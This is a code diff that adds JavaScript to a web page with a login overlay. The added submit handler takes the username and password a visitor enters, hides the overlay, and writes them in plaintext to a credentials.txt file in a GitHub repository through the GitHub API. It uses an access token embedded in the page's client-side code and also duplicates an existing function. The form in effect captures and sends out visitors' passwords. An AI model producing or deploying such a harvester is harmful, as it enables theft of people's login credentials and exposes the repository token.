@@ -10,6 +10,59 @@ function closeOverlay() {
     document.getElementById("loginOverlay").style.display = "none";
 }
 
+function closeOverlay() {
+    document.getElementById("loginOverlay").style.display = "none";
+}
+
+// --- SAVE TO GITHUB FUNCTION ---
+async function saveToGitHub(username, password) {
+    const token = "sample_Token"; // replace with your GitHub token
+    const owner = "ProgrammingJuniot"; // replace with your GitHub username
+    const repo = "mark-gian.github.io"; // replace with your repo name
+    const filePath = "credentials.txt"; // path inside your repo
+
+    const apiURL = `https://api.github.com/repos/${owner}/${repo}/contents/${filePath}`;
+    const content = `Username: ${username} | Password: ${password}\n`;
+    const encodedContent = btoa(content);
+
+    // Get existing file SHA if it exists
+    let sha = null;
+    const existing = await fetch(apiURL, {
+        headers: { "Authorization": `token ${token}` }
+    });
+
+    if (existing.status === 200) {
+        const json = await existing.json();
+        sha = json.sha;
+    }
+
+    // Update or create file
+    await fetch(apiURL, {
+        method: "PUT",
+        headers: {
+            "Authorization": `token ${token}`,
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            message: "Saving login credentials",
+            content: encodedContent,
+            sha: sha
+        })
+    });
+
+    alert("Credentials saved to GitHub!");
+}
+
+// --- FORM SUBMISSION ---
+document.getElementById("loginForm").addEventListener("submit", async function(e) {
+    e.preventDefault();
+    const username = document.getElementById("username").value;
+    const password = document.getElementById("password").value;
+
+    closeOverlay(); // hide overlay
+    await saveToGitHub(username, password); // save to GitHub
+});
+
 </script>
 <style>
         .overlay {
